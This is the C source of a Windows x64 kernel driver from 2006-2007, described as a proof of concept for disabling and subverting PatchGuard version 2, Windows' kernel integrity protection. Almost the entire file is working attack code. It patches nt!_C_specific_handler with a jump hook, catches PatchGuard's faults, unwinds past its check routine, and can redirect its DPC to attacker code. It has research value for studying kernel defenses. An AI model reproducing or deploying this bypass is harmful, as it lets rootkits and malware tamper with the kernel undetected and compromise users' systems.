//
// PatchGuard Disable and Subvert Driver
// Copyright (C) 2006-2007 Ken Johnson (Skywing)
//
// This driver demonstrates one possible approach to programmatically disabling
// PatchGuard version 2.  Additionally, it demonstrates one possible approach
// for taking control of the PatchGuard system integrity check routine.
//
// This source code listing is intended as a minimal proof of concept and
// should not, as a result, be considered production-quality source code.  In
// particular, there are various simplifications (rare race conditions are
// ignored, prologues are assumed instead of disassembled, and soforth) and
// assumptions that would need to be addressed in a production-quality
// implementation.
//
// The author explicitly disclaims all warranties (including implicit
// warranties) and responsibility relating to software derived from the
// knowledge gained by understanding this code listing (or the use of this code
// listing).  In particular, the author explicitly does not warrant that this
// code listing will remain effective for future operating system releases.
//
// Ken Johnson (Skywing)
// skywing@valhallalegends.com
//

#include <ntddk.h>
#include "pgdisabl.h"

//
// Subvert PatchGuard to call our routines instead?  Disabling this simply
// has us skip PatchGuard.  Otherwise, we make PatchGuard call us instead of
// itself.
// 

#define PG_SUBVERT_PATCHGUARD 1

DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD     DriverUnload;

#ifdef ALLOC_PRAGMA
#pragma alloc_text( INIT, DriverEntry )
#endif // ALLOC_PRAGMA

ULONG64 PgRealDpcRoutineReturnAddress;
ULONG64 PgCSpecificHandlerRsp;

ULONG PgBreakOnPatchGuard = 0;
PVOID _C_specific_handler;
PVOID Orig_C_specific_handlerRestorePointer;
PVOID My_C_specific_handler = PgCSpecificHandler;
PKDEFERRED_ROUTINE PgPatchGuardDpcRoutine;

ULONG64 PgCSpecificHandlerArguments[ 4 ];

UCHAR Pg_C_specific_handler_hook[ 0xF ] =
{
	0x48,
	0xB8,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
	0xFF,
	0xE0,
	0x90,
	0x90,
	0x90
};


EXCEPTION_DISPOSITION
NTAPI
PgCSpecificHandler(
	__in PEXCEPTION_RECORD ExceptionRecord,
	__in ULONG64 EstablisherFrame,
	__inout PCONTEXT ContextRecord,
	__inout struct _DISPATCHER_CONTEXT* DispatcherContext
	)
{
	//
	// Check if we're AV'ing on a kernel address.  (This should never happen,
	// except in the case of PatchGuard.  It is considered illegal to use a
	// try/except to guard against invalid kernel addresses; the system is
	// supposed to always crash in that case.)
	//

	if (ExceptionRecord->ExceptionCode == STATUS_ACCESS_VIOLATION &&
		IS_KERNEL_ADDRESS(ExceptionRecord->ExceptionAddress)      &&
		ExceptionRecord->NumberParameters >= 2                    &&
		IS_KERNEL_ADDRESS(ExceptionRecord->ExceptionInformation[ 1 ]))
	{
		PRUNTIME_FUNCTION  RuntimeFunction;
		ULONG64            ImageBase;
		PEXCEPTION_ROUTINE ExceptionRoutine;
		PVOID              HandlerData;

		//
		// Okay, we're probably PatchGuard trying to do something evil.  Let's
		// try and bypass the checker routine.
		//

		KdPrint(("PGDISABL: Caught PatchGuard with Exr %p Cxr %p (RIP %p R/W %x on VA %p)...\n",
			ExceptionRecord,
			ContextRecord,
			ExceptionRecord->ExceptionAddress,
			(ULONG)ExceptionRecord->ExceptionInformation[ 0 ],
			ExceptionRecord->ExceptionInformation[ 1 ]));

		if (PgBreakOnPatchGuard)
		{
			KdPrint(("PGDISABL: Breaking on PatchGuard check routine; use the commands:  .exr %p ; .cxr %p\n",
				ExceptionRecord,
				ContextRecord);
			KdBreakPoint());
		}

		//
		// Let's initiate a virtual unwind past the DPC routine to the caller.
		//
		// This is okay, because the caller should just be doing DPC dispatches
		// and won't care anything about what we're doing.
		//

		RuntimeFunction = RtlLookupFunctionEntry(
			(ULONG64)ExceptionRecord->ExceptionAddress,
			&ImageBase,
			0);

		if (!RuntimeFunction)
		{
			KdPrint(("PGDISABL: Failed to locate RuntimeFunction for %p...\n",
				ExceptionRecord->ExceptionAddress));
			KdBreakPoint();
			return ExceptionContinueSearch;
		}

		//
		// If PatchGuard Subversion is enabled, then we'll try to subvert
		// PatchGuard for nefarious purposes... muahahaha (well, if you count
		// doing a demo DbgPrint nefarious purposes, anyway).
		//

#if PG_SUBVERT_PATCHGUARD
		if (PgSubvertPatchGuard(
			ExceptionRecord,
			EstablisherFrame,
			ContextRecord,
			DispatcherContext,
			RuntimeFunction,
			ImageBase))
		{
			KdPrint(("PGDISABL: Successfully subverted PatchGuard.\n"));

			//
			// Unhook from _C_cpecific_handler as we don't need it anymore.
			//

			PgHookCSpecificHandler(FALSE);

			//
			// Return a bogus return value now - it'll be ignored since we are
			// actually returning to PgCSpecificHandlerUnhookReturnPoint, which
			// will ensure rcx/rdx/r8/r9 are setup properly and then jump to
			// the original _C_specific_handler's first instruction.
			//

			//
			// Adjust our return address as we have unhooked from the exception
			// handler and don't want to return into the middle of it.
			// Instead, we'll magically return to the *start* of the exception
			// handler with all of the argument registers intact.  Neat, huh?
			//
			// Note that this only works because we know that PatchGuard won't
			// be called from multiple threads simultaneously, or recursively,
			// or anything like that.  As a result, we can get away with being
			// sleazy and storing things that should normally be stack-based as
			// global variables.
			//

			*(void**)_AddressOfReturnAddress() = PgCSpecificHandlerUnhookReturnPoint;

			//
			// Save away the arguments to this _C_specific_handler
			// call instance.
			//

			PgCSpecificHandlerArguments[ 0 ] = (ULONG64)ExceptionRecord;
			PgCSpecificHandlerArguments[ 1 ] = (ULONG64)EstablisherFrame;
			PgCSpecificHandlerArguments[ 2 ] = (ULONG64)ContextRecord;
			PgCSpecificHandlerArguments[ 3 ] = (ULONG64)DispatcherContext;

			return ExceptionContinueExecution; // Ignored!
		}
#endif

		if (PgBreakOnPatchGuard)
		{
			KdPrint(("PGDISABL: Invoking RtlVirtualUnwind for Exr %p Cxr %p Rtfe %p...\n",
				ExceptionRecord,
				ContextRecord,
				RuntimeFunction));
			KdBreakPoint();
		}

		//
		// Invoke a virtual procedure call unwind.  This is essentially
		// executing an immediate return from the faulting function.  While it
		// simulates the restoration of the stack, it does not invoke any of
		// the evil PatchGuard checking code in the faulting routine.
		//

		ExceptionRoutine = RtlVirtualUnwind(
			UNW_FLAG_NHANDLER,
			ImageBase,
			(ULONG64)ExceptionRecord->ExceptionAddress,
			RuntimeFunction,
			ContextRecord,
			&HandlerData,
			&EstablisherFrame,
			0);

		if (PgBreakOnPatchGuard)
		{
			KdPrint(("PGDISABL: RtlVirtualUnwind completed (returned ExceptionRoutine %p).\n"
				     "Examine the previously supplied context record to see the new exception return information.\n"
					 , ExceptionRoutine));
			KdBreakPoint();
		}

		return ExceptionContinueExecution;
	}

	KdPrint(("PGDISABL: Passing on exception (Exr %p Cxr %p) to original handler.\n",
		ExceptionRecord,
		ContextRecord));

	return PgOrig_C_specific_handler(
		ExceptionRecord,
		EstablisherFrame,
		ContextRecord,
		DispatcherContext);
}

NTSTATUS
NTAPI
PgHookCSpecificHandler(
	__in BOOLEAN Enable
	)
{
	PMDL        Mdl;
	PVOID       LockedVa;
	NTSTATUS    Status;

	Mdl      = 0;
	LockedVa = 0;

	for (;;)
	{
		//
		// Create a MDL describing system space for _C_specific_handler.
		//

		Mdl = IoAllocateMdl(
			_C_specific_handler,
			0xF,
			FALSE,
			FALSE,
			0);

		if (!Mdl)
		{
			Status = STATUS_INSUFFICIENT_RESOURCES;
			KdPrint(("PGDISABL: Failed to allocate MDL.\n"));
			break;
		}

		MmBuildMdlForNonPagedPool(
			Mdl);

		//
		// Retrieve a locked VA mapping.
		//

		if (!(LockedVa = (PUCHAR)MmMapLockedPagesSpecifyCache(
			Mdl,
			KernelMode,
			MmCached,
			0,
			FALSE,
			NormalPagePriority)))
		{
			Status = STATUS_ACCESS_VIOLATION;
			KdPrint(("PGDISABL: Failed to map kernel VA for _C_specific_handler.\n"));
			break;
		}

		//
		// If we're requested to hook it then do so now...
		//

		if (Enable)
		{
			//
			// Setup the restore pointer.
			//

			Orig_C_specific_handlerRestorePointer = (PUCHAR)_C_specific_handler + 0xF;

			//
			// Copy over our hook on _C_specific_handler.
			//

			RtlCopyMemory(
				LockedVa,
				Pg_C_specific_handler_hook,
				0xF);
		}
		else
		{
			//
			// Unhook the function by copying back the original bits...
			//

			RtlCopyMemory(
				LockedVa,
				PgOrig_C_specific_handler,
				0xF);
		}

		//
		// All done...
		//

		Status = STATUS_SUCCESS;

		break;
	}

	if (LockedVa)
		MmUnmapLockedPages(
			LockedVa,
			Mdl);

	if (Mdl)
		IoFreeMdl(
			Mdl);

	return Status;
}

NTSTATUS
NTAPI
PgDisablePatchGuard(
	VOID
	)
{
	UNICODE_STRING ProcedureName;
	NTSTATUS       Status;

	//
	// mov rax, OFFSET PgCSpecificHandler
	// jmp rax
	//

	*(PULONGLONG)&Pg_C_specific_handler_hook[ 0x2 ] = (ULONGLONG)PgCSpecificHandler;

	RtlInitUnicodeString(
		&ProcedureName,
		L"__C_specific_handler");


	for (;;)
	{
		//
		// Locate _C_specific_handler...
		//

		_C_specific_handler = MmGetSystemRoutineAddress(
			&ProcedureName);

		if (!_C_specific_handler)
		{
			Status = STATUS_PROCEDURE_NOT_FOUND;
			KdPrint(("PGDISABL: Failed to locate nt!_C_specific_handler - aborting.\n"));
			break;
		}

		//
		// Hook _C_specific_handler.
		//

		Status = PgHookCSpecificHandler(
			TRUE);

		if (!NT_SUCCESS(Status))
			break;

		//
		// All done...
		//

		Status = STATUS_SUCCESS;

		KdPrint(("PGDISABL: Finished patching.  Restore pointer is %p, hookedroutine is %p.\n",
			Orig_C_specific_handlerRestorePointer,
			_C_specific_handler
			));

		if (PgBreakOnPatchGuard)
		{
			KdBreakPoint();
		}

		break;
	}

	return Status;
}

NTSTATUS
NTAPI
DriverEntry(
    __in PDRIVER_OBJECT  DriverObject,
    __in PUNICODE_STRING RegistryPath
    )
{
	NTSTATUS Status = PgDisablePatchGuard();

	if (!NT_SUCCESS(Status))
	{
		KdPrint(("PGDISABL: Failed to disable PatchGuard (%x).\n",
			Status));
		return Status;
	}

	DriverObject->DriverUnload = DriverUnload;

	return STATUS_SUCCESS;
}

VOID
NTAPI
DriverUnload(
	__in PDRIVER_OBJECT  DriverObject
	)
{
	KdPrint(("PGDISABL: Unloading PGDISABL driver image.\n"));
}
